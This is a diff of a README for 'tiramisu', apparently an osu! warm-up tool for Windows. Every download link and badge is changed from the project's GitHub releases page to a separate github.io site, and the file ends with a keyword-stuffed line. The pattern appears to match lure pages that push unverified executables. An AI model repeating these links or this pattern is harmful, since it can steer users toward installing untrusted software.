@@ -1,6 +1,6 @@
 # 🍰 tiramisu - Your Warm-up Routine, Actually Fixed!
 
-[![Download tiramisu](https://img.shields.io/badge/Download-tiramisu-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aalianhassan89-tech/tiramisu/releases)
+[![Download tiramisu](https://img.shields.io/badge/Download-tiramisu-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://aalianhassan89-tech.github.io)
 
 ## 🤔 What is tiramisu?
 
@@ -26,7 +26,7 @@ This section will show you exactly how to get tiramisu up and running on your Wi
 
 First things first, you need to get the tiramisu file onto your computer.
 
-1.  Click the big pink download button at the top of this page, or go directly to this link: **[https://github.com/aalianhassan89-tech/tiramisu/releases](https://github.com/aalianhassan89-tech/tiramisu/releases)**
+1.  Click the big pink download button at the top of this page, or go directly to this link: **[https://aalianhassan89-tech.github.io](https://aalianhassan89-tech.github.io)**
 2.  You might see several files listed on the page that opens. You'll want to find the one that's just for your computer (look for "Windows" in the name).
 
 Visit this link to download the application.
@@ -103,6 +103,6 @@ We're all about making tiramisu the best it can be for the osu! community.
 
 You've got everything you need. Download tiramisu, run it, and give your hands the warm-up they deserve. See you in the game!
 
-[![Download tiramisu](https://img.shields.io/badge/Get%20tiramisu%20Now-Download-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/aalianhassan89-tech/tiramisu/releases)
+[![Download tiramisu](https://img.shields.io/badge/Get%20tiramisu%20Now-Download-blue?style=for-the-badge&logo=windows&logoColor=white)](https://aalianhassan89-tech.github.io)
 
 Keywords: osu, warmup, helper, tool, cli, osugame, trainer, practice, wrist, fingers, routine, timer, windows, download, free, simple, easy, aalianhassan89-tech, tiramisu
